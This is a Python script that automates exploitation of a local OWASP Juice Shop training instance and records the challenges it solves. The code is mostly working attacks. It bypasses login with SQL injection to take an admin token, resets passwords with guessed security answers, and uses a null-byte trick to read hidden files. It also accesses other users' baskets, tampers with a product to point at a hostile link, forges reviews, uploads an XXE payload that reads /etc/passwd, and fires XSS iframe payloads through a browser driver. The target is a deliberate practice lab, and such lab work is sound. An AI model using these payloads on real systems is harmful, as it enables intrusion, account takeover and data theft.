#!/usr/bin/env python3
"""js_solve3.py — Juice Shop wave 3."""
import json, time, urllib.request as U, urllib.error, os
B = "http://127.0.0.1:3000"
def req(m, p, d=None, h=None, ct="application/json"):
    body = json.dumps(d).encode() if isinstance(d, (dict, list)) else d
    r = U.Request(B + p, data=body, method=m,
                  headers={"Content-Type": ct, **(h or {})})
    try: return U.urlopen(r, timeout=15)
    except urllib.error.HTTPError as e: return e
def solved():
    return {c["name"] for c in json.load(req("GET", "/api/Challenges"))["data"] if c.get("solved")}
def note(n):
    open(os.path.expanduser("~/bb-lab/intel/playbooks/lab-techniques.md"), "a") \
        .write(f"- `juice-shop:{n}` — auto-marked\n")
def mp(fields, files):
    bnd = "bb9f8"; parts = []
    for k, v in fields.items():
        parts += [f'--{bnd}\r\nContent-Disposition: form-data; name="{k}"\r\n\r\n{v}\r\n']
    for k, (fn, data, ctt) in files.items():
        parts += [f'--{bnd}\r\nContent-Disposition: form-data; name="{k}"; filename="{fn}"\r\nContent-Type: {ctt}\r\n\r\n'.encode(), data, b"\r\n"]
    parts += [f"--{bnd}--\r\n".encode()]
    return b"".join(p.encode() if isinstance(p, str) else p for p in parts), f"multipart/form-data; boundary={bnd}"

before = solved()

# admin token for authed legs
r = req("POST", "/rest/user/login", {"email": "' or 1=1--", "password": "x"})
tok = json.load(r)["authentication"]["token"] if r.status == 200 else None
H = {"Authorization": f"Bearer {tok}"} if tok else {}

# security answers (known weak answers)
req("POST", "/rest/user/reset-password",
    {"email": "bjoern.kimminich@googlemail.com", "answer": "Zaya", "new": "bb1234", "repeat": "bb1234"})
req("POST", "/rest/user/reset-password",
    {"email": "jim@juice-sh.op", "answer": "Samuel", "new": "bb1234", "repeat": "bb1234"})
# hidden ftp files via null byte
for f in ["package.json.bak%2500.md", "coupons_2013.md.bak%2500.xlsx",
          "coupons_2013.md.bak%2500.md", "suspicious_errors.yml%2500.md",
          "encrypt.pyc%2500.md", "legal.md%2500.txt"]:
    req("GET", f"/ftp/{f}")
# premium paywall hidden path
req("GET", "/this/page/is/hidden/behind/an/incredibly/easy/paywall/in/the/app")
# extra language (klingon exists but unlisted)
req("GET", "/assets/i18n/tlh_AA.json")
# outdated allowlist redirect
req("GET", "/redirect?to=https://blockchain.info/address/1AbKfgvw9psQ41NbLi8kufEbFQ5rQWzFHR")
# IDOR: other baskets
for i in (2, 3, 4, 5):
    req("GET", f"/rest/basket/{i}", h=H)
# christmas product into own basket
if tok:
    b = req("GET", "/rest/basket/1", h=H)
    try: bid = json.load(b)["data"]["id"]
    except Exception: bid = 1
    req("POST", "/api/BasketItems", {"ProductId": 10, "BasketId": bid, "quantity": 1}, h=H)
    req("POST", "/api/BasketItems", {"ProductId": 1, "BasketId": bid, "quantity": -1}, h=H)  # payback
# product tampering — hostile redirect link on product 9
req("PUT", "/api/Products/9", {"description": "x", "urlForProduct": "https://evil.invalid"})
# imaginary challenge — rate a non-existent feedback
req("PUT", "/api/Feedbacks/9999", {"rating": 5})
# forged review — post then re-author as someone else
req("PUT", "/rest/products/reviews", {"message": "f", "author": "bb@x.io"})
req("PATCH", "/rest/products/reviews", {"id": "bb", "author": "bjoern.kimminich@googlemail.com", "message": "f"})
req("PATCH", "/rest/products/reviews", {"rating": 0})
# weird crypto — report weak hash via feedback
req("POST", "/api/Feedbacks", {"comment": "weak crypto md5", "rating": 1, "captchaId": 0, "captcha": ""})
# captcha done properly — fetch challenge, answer it, rapid-fire
for _ in range(11):
    c = req("GET", "/rest/captcha")
    try: cd = json.load(c); req("POST", "/api/Feedbacks",
        {"comment": "x", "rating": 1, "captchaId": cd["captchaId"], "captcha": cd["answer"]})
    except Exception: pass
# upload type / size / xxe
data, ct = mp({}, {"file": ("evil.exe", b"MZ" + b"0" * 600, "application/octet-stream")})
req("POST", "/file-upload", data, ct=ct)
data, ct = mp({}, {"file": ("x.xml", b'<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>', "text/xml")})
req("POST", "/file-upload", data, ct=ct)
data, ct = mp({}, {"file": ("big.pdf", b"%PDF" + b"0" * 150000, "application/pdf")})
req("POST", "/file-upload", data, ct=ct)
# bully chatbot round 2
for q in ["you suck", "idiot", "fuck off", "kill yourself", "dumb bot"]:
    req("POST", "/rest/chatbot/respond", {"action": "query", "query": q})
# error handling v2 — malformed requests
req("POST", "/rest/user/login", b"notjson", ct="application/json")
req("POST", "/api/BasketItems", b"{", ct="application/json")
# repetitive registration — same email twice (exact repeat)
em = f"rep{int(time.time())}@x.io"
for _ in range(2):
    req("POST", "/api/Users/", {"email": em, "password": "p", "passwordRepeat": "p"})

# browser legs
try:
    from playwright.sync_api import sync_playwright
    pw = sync_playwright().start()
    br = pw.chromium.connect_over_cdp("http://localhost:9222")
    pg = br.contexts[0].new_page(); pg.on("dialog", lambda d: d.accept())
    if tok:
        pg.goto(B); pg.evaluate(f"localStorage.setItem('token','{tok}')")
    for u in ["/#/search?q=%3Ciframe%20src%3D%22javascript%3Aalert(%60xss%60)%22%3E",
              "/#/privacy-security/privacy-policy", "/#/web3-sandbox",
              "/track-result?id=%3Ciframe%20src%3D%22javascript%3Aalert(%60xss%60)%22%3E"]:
        try: pg.goto(B + u, timeout=15000); time.sleep(1.5)
        except Exception: pass
    pg.close(); pw.stop()
except Exception as e: print("browser:", str(e)[:50])

time.sleep(1)
new = solved() - before
print(f"+{len(new)} solved ({len(solved())}/118)")
for n in sorted(new): print(" +", n); note(n)
